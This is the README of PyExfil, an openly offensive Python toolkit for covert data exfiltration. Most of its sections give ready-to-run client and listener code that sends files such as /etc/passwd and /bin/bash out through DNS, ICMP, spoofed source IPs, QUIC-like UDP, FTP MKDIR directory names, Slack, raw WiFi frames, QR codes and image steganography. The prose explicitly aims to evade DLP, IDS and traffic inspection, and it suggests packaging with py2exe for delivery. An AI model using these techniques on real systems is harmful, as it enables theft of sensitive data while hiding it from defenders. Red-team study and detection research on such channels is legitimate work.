# PyExfil

## Abstract
This started as a PoC project but has later turned into something a bit more. Currently it's an Alpha-Alpha stage package, not yet tested (and will appriciate any feedbacks and commits) designed to show several techniques of data exfiltration is real world scenarios. Currently here are what the package supports and what is allows is:

* Network
  * DNS query.
  * HTTP Cookie.
  * ICMP (8).
  * NTP requests.
  * BGP Open.
  * HTTPS Replace Certificate.
  * QUIC - No Certificate.
  * Slack Exfiltration.
  * POP3 Authentication (as password) - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
  * FTP MKDIR technique - Idea thanks to [Itzik Kotler](https://github.com/ikotler)
  * DB-LSP (Broadcast or Unicast).
  * Source IP-based Exfiltration
* Physical
  * Audio
  * QR Codes
  * WiFi - On Payload
* Steganography
  * Binary Offset
  * Video Transcript to Dictionary

Package is still not really usable and will provide multiple issues. Please wait for a more reliable version to come along. You can track changes at the official [GitHub page](http://ytisf.github.io/PyExfil/).
The release of Symantec's Regin research was the initiator of this module. It is inspired by some of the features of [Regin](http://www.symantec.com/connect/blogs/regin-top-tier-espionage-tool-enables-stealthy-surveillance). Go read about it :)

## Server Installation
All requirements can be met with a `pip install --user -r requirments.txt`. After that the server is easy to execute. Notice that in some cases you might want to use `py2exe` before delivering the package to the code you want to operate.

## Physical

### QR Codes

So recently we have decided to impliment some physical data exfiltration techniques assuming some networks might be airgapped from any internet connectivity. So this is the first one. It will encode a file in several QR codes, display them on the screen one by one and it comes with a decoder to recompile that into the file itself.

It was written under MacOS so for any bugs please report to us so that we can fix them.

#### Prepare
```bash
brew tap homebrew/science
brew install opencv
pip install --user -r pyexfil/physical/qr/requirements.txt
```

#### To QR Codes
```python
from pyexfil.physical.qr.generator import CreateQRs, PlayQRs

if __name__ == "__main__":
    if CreateQRs('/etc/passwd'):
        sys.stdout.write("Will now start playing the QRs.\n")
        time.sleep(DELAY)
        PlayQRs()  # This will play the QRs on screen
    else:
        sys.stderr.write("Something went wrong with creating QRs.\n")
        sys.exit(1)

```

#### From QRs to File
```python
from pyexfil.physical.qr.decoder import startFlow, DIR_MODE, CAM_MODE

if __name__ == "__main__":
    startFlow(mode=DIR_MODE) # will use data in 'output' directory.
    startFlow(mode=CAM_MODE) # will use data from camera

```

### WiFi - On Payload
This technique is especially efficient when you have some physical proximity to the machine that will exfiltrate the data and for large data sets. The idea behind this is to create Dot11 frames without any network assosiation and sending them out. Any DLP device should not detect this as there is no 'real' network connectivity. There is no handshake, assosiation or any other indication that the machine is communicating over WiFi other than the NIC sending packets. This method can exfiltrate large data sets due to these conditions but required physical proximity to intercept the packets. Please bear in mind that we have built no quality compensation mechanism. Therefore, a single dropped packet and the data is lost. As always, we endorse anyone to add QA features to this technique and make it more operationally sound.

#### Exfiltration
```python
from pyexfil.physical.wifiPayload import client

client.exfiltrate(file_path="/etc/passwd", key="shut_the_fuck_up_donnie!")
```

#### Interception
```python
from pyexfil.physical.wifiPayload import server

server.StartListening(adapter="en0")
```


## Network Exfiltration

### DNS
This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.

### HTTPS Replace certificate
With this method you are configuring an HTTP server to impersonate the certificate. When you exfiltrate data, it will use the original server to exchange certificates with the duplicating server (port forwarding) and then, when this is complete, transmit the data with AES encryption but wraps it up as SSL Application Data as there is no real way of telling this.

#### Server Setup - String Mode
```python
from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192)
server.startlistening()
```

#### Client Setup - String Mode
```python
from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()
```

#### Server Setup - File Mode
```python
from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192, file_mode=True)
server.startlistening()
```

#### Client Setup - File Mode
```python
from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendFile("/etc/passwd")
client.close()
```


### HTTP Cookie
Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookie field is supposed to be random noise to any listener in the middle and therefore is very difficult to filter.

### ICMP
Uses ICMP 8 packets (echo request) to add a file payload to it. It reimplemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.

### DB_LSP
Dropbox uses UDP broadcast packets to identify other Dropbox instances on the LAN and sync files between them. This exfiltration method can work in one out of two scenarios:
  * Unicast exfiltration - sending the data over DB-LSP packets to your server.
  * LAN Broadcast communication - assuming you're on the same LAN you can configure a listener and a sender to communicate over broadcast, masking the sender and receiver and in a way that might surpass some alerting mechnisms as there is "no direct connection" between them.

#### Shell Mode
```bash
$ sudo python dblsp.py

    To communicate between two hosts over broadcast you will need:
    	1) Setup an ecnryption key whichi will be identical on both hosts.
    		set key 123456
    	2) Know which host is going to broadcast the message:
    		set listener 10.0.0.1
    	3) Start active mode:
    		active 10.0.0.255

    Now just send messages with:
    	send "hello world"


DB_LSP > set key 123456
 key --> 123456.
DB_LSP > set listener 10.0.0.2
 listener --> 10.0.0.2.
DB_LSP > active 10.0.0.255
Starting active mode with 10.0.0.255.
Starting listener for 10.0.0.2.
10.0.0.255@DB_LSP > send hello
184 bytes sent to ('10.0.0.255', 17500).
10.0.0.255@DB_LSP >
```
Please notice that the `listener` is the IP from which you're expecting to get the message. This is so that when you get a broadcast you know which one to decode and understand. `active` will point to which IP address to send the UDP packets. Use a `.255` address for broadcast or a specific IP for unicast.

#### 'API'
##### Constant Sniff and Decode :
```python
SniffAndDecode(key="123456", host="OtherIP", port=17500)
```

##### Send a message:
```python
obj = DB_LSP(key="123456", data="Hello World", host="192.168.0.255", port=17500)
obj.Send()
```

### FTP MKDIR
FTP MKDIR is a technique based on using an FTP server and assuming that the corporate is using an active MiTM to disable file upload. With this in mind, the file is then compressed using `zlib` and base64 encoded (to be ASCII representable) and then splitted into chunks. Each chunk is then made the name of a directory using MKDIR command (which is not a file upload and should be enabled).
It can be used in the following manner:

#### File Exfil
```python
# Port is by default 21, but can be changed with 'port=2121'
# Credentials are () but can be added with: creds=('user','pass')
# TLS is disabled by default but could be added with tls=True
FTPexf = FTPExfiltrator(server="10.211.55.15", file2exfil="/bin/bash")
FTPexf.get_file_chunks()
FTPexf.build_final_chunks()
FTPexf.send_chunks()
```

#### File Reconstruction
```python
# Directory argument can be added with: dir="/home/user/directory"
FTPHand = GetContent()
FTPHand.get_file()
```

### Slack Exfiltration
Slack exfiltration uses the Slack API to move files around. Please notice you will need to tweak the code to make it stealthy. Right now it is defaultly designed to be noisy and appear on the user's log to make sure you're using this in a 'good' manner.

#### Slack Server
```python
from pyexfil.network.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.Listen()
```

#### Slack Client

```python
from pyexfil.network.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.ExfiltrateFile(file_path="/etc/passwd")
```

### Source IP Based Exfiltration

Will take a file and attempt to exfiltrate it on the source IP field in a TCP/IP packet. This method is slow, and depending on the configuration of the IDSs might trigger more alerts or none at all. We figured out it worked in a lot of our cases although it was relatively slow. It is written poorly and will not even support exfiltration of two files at the same time and will not make up for integrity issues. We welcome contributors here.

#### Exfiltration
```python
from pyexfil.network.SpoofIP import spoofIPs_client

_send(file_path="/etc/passwd", to="127.0.0.1")
```

#### Decoding (must run simultaneously)
```python
from pyexfil.network.SpoofIP import spoofIPs_server

sniff(iface="en0", prn=pkt_callback, filter="tcp", store=0)
```



### QUIC
In this method, we exfiltrate files over UDP 443 as to look like QUIC. Currently, it is written as first PoC and less as a functional tool. For example, will only work with one file at a time and not concurrent. Vailidy only checks MD5 and not individual packets (server does not request missing chunks from client, which it should). Nevertheless, this seems to work fine in several checks we've done and seems viable exfiltration for single file.

In the future, we should add the things mentioned above. Currently, this does not seem like there is a profiling that can be done on these streams as they appear to be identified by all interceptors as QUIC and unresolvable to the content (while QUIC uses true SSL, this uses AES which still gives a binary blob which is meaningless).

#### Server
```python
from pyexfil.network.QUIC.quic_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
server.startlistening()
```

#### Client
```python
from pyexfil.network.QUIC.quic_client import QUICClient

client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server

# This part is just for debugging and printing, no read use
a = struct.unpack('<LL', client.sequence)                       # Get CID used
a = (a[1] << 32) + a[0]
sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)

client.sendFile("/etc/passwd")                                  # Exfil File
client.close()
```

## Steganography

### Video Dictionary

This module will take as an input a file to exfiltrate and a video file. The next thing it will do is convert the file to exfiltrate into a series of `chr(byte)`. After that, it will attempt to get several frames from the video file and match each corresponding `pixels[i](r,g,b)` into each of the 0-255 possible bytes. It will then create a comressed and plain text dictionary for the original file in those images creating an output of a dictionary file with will hold a CSV with `frameindex, pixel (offset), colour_value(r/g/b)`. This dictionary is absolutely useless without the original identical video (no recompression or alterations at all).

We think this technique can be particularly useful in scenarios where there are very powerful data inspections on the traffic and that the original data is very easy to detect (CC information or emails for example). Let's take the instance where the data you would like to exfiltrate for the purpose of your red-team / pentest purpose is plain text credit cards and that traffic is thoroughly inspected while blocking any type of binary/encrypted data form. Basically a very restrictive white-list based traffic rules for example.

Since the output of this module will be a CSV dictionary which will contain none of the original data in anyway, one can ZIP it (we used zlib) and get a fairly decent compression rate, while if anyone would like to examine the CSV file (which will be easily recoverable) one could always add any headers they would like and get a reasonable CSV that is easy to maintaine feasability of its use.

To make stuff easier, we've added a functionality to download a video from YouTube with a specific quality and frame to make sure one could use it without actually transferring the video file from one end to the other.

#### Usage

```python
from pyexfil.Stega.video_dict.vid_to_dict import TranscriptData, DecodeDictionary

TranscriptData(video_file="video.mp4", input_file="/etc/passwd", output_index="output.map")
DecodeDictionary(originalVideo="video.mp4", dictionaryFile='output.map', outputFile="original_passwd")
```

### Binary Offset

The binary offset technique will take a file, (zlib it), convert it into a binary string *b01010101...*, and then take an image, and convert it into a pixel array with 3 entities per pixel `(int(R),int(G),int(B))`. In case where the image has a transperancy pixel (PNG for example) the PyExfil will currently ignore it. Then the binary string will be incorprated into the pixel array and saved in another location.

The result, is an image file that contains all the data. Without the original image file you cannot decode the image as there is nothing to compare the changes to.

#### As SA Module

If you wish to encode or decode an image in the most manual way you can use the module as a stand alone executable (py2exe anyone?).

```bash
binoffset.py baseimage "originalImage.jpg" "outputpath.jpg"
binoffset.py encode "baseImage.jpg" "/etc/passwd" "newImage.jpg"
binoffset.py decode "newImage.jpg" "baseImage.jpg" "passwdFile"
```

So in total, the stages are:

1. Convert an image to a reliable base image for the use by this technique.
2. Take the file `/etc/passwd` and use the base image `baseImage.jpg` to create a new image named `newImage.jpg` with all the data from `/etc/passwd` encorporated into it.
3. Take the image containing the data along with the base image and give me a file named `passwdFile` with all the content of `/etc/passwd` in it.

#### As a Python Module

```python
from pyexfil.Stega.binoffset.binoffset import PrepareBaseImage, DecodeExfiltrationFile, CreateExfiltrationFile

originalImage = 'myLogo.png'      # Image downloaded from the internet
fileToExfiltrate = '/etc/passwd'  # The file you want to embed in the picture

# Prepare image for use
PrepareBaseImage(imagePath=originalImage, outputPath="base_"+originalImage)

# On the machine with the file
CreateExfiltrationFile(originalImage="base_"+originalImage, rawData=fileToExfiltrate, OutputImage="niceImage.png")

# After getting the image back, use this to decode it
DecodeExfiltrationFile(originalImage="base_"+originalImage, newImage="niceImage.png", outputPath="passwd.file")

```

## Developers' Documentation

Please notice that although we have tried to keep this a collection of relatively separated stand alone modules so that converting them to static binaries for various operating systems would be as easy as possible, some things we have decided to turn into modules that would be shared across the board while attempting to keep is as depency free as possible. Such a component for now is `pyexfil/includes/prepare`. This module contains the methos of converting files (compressing, encrypting, encoding and splitting) into chunks ready to be sent or decoded.

You can use it in the following way:

```python
from pyexfil.includes.prepare import PrepFile, RebuildFile, DecodePacket

proc = PrepFile('/etc/passwd', kind='binary') # will yield a dictionary

# Send the data over
sock = socket.socket()
sock.connect(('google.com', 443))
for i in proc['Packets']:
    sock.send(i)
sock.close()

# Rebuilding the data:
conjoint = []
for packet in proc['Packets']:
    b = DecodePacket(packet)
    conjoint.append(b)

# Verify and rebuild the file:
print RebuildFile(conjoint)


```


## Future Stuff
### Version Alpha
- [X] Check why HTTP Cookie exfiltration keeps failing CRC checks. (Fixed in patch #7 by Sheksa)
- [X] Add NTP exfiltration. (Thanks to barachy for the idea)
- [X] Complete NTP listener.
- [X] BGP Data exfiltration + listener.
- [X] FTP MKDIR Exfiltrator & combiner.

### Version Beta
- [x] More QA needed and fast!
- [ ] Write a proper Documentation.
- [ ] Fix that poorly written *setup.py*.

### Version 1.0
- [ ] Enable simultaneous support for all data exfiltration methods.
- [ ] Unify all to a single platform.
- [ ] Testing for py2exe support.
- [ ] Translate module to C Linux.
- [ ] Get a damn logo :)

## Thanks
Thanks [Wireshark](http://wireshark.com/) for your awesome wiki and tool. Especially [packet dumps](http://wiki.wireshark.org/SampleCaptures).
Thanks to barachy and AM for ideas on protocols to use.
